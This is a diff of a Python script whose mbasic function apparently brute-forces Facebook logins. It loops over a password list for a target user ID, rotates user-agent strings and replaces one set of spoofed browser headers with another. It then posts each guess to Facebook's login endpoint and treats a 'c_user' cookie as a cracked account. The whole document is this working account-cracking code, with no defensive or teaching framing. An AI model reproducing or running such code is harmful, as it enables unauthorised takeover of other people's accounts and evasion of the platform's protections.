@@ -199,6 +199,7 @@ def mbasic(uid,pwx,tl):
 	global agents
 	try:
 		for ps in pwx:
+			user = ['Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5']
 			bi = random.choice([A,B,C,D,E,F,G,H])
 			session = requests.Session()
 			pro = random.choice(user)
@@ -213,24 +214,23 @@ def mbasic(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = ({"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-           "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=0.9',
-            "cache-control": 'no-cache',
-            "pragma": 'no-cache',
-            "referer": 'https://m.facebook.com/',
-            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-            "sec-ch-ua-mobile": '?0',
-            "sec-ch-ua-platform":'"Windows"',
-            "sec-fetch-dest": 'manifest',
-            "sec-fetch-mode": 'cors',
-            "sec-fetch-site": 'same-origin',
-            "user-agent":pro,})
-
-#user-agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36}
+			header_freefb = {'authority':"b-api.facebook.com",
+			'method':'GET',
+			'path':'/',
+			'scheme':'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-encoding':'gzip, deflate, br',
+			'accept-language': 'en-US,en;q=0.9',
+			'cache-control': 'max-age=0',			
+			'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			"sec-fetch-dest": "document",
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-site': 'cross-site',
+			'upgrade-insecure-requests': '1',
+			"sec-fetch-user": "?1",
+			'user-agent':pro}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
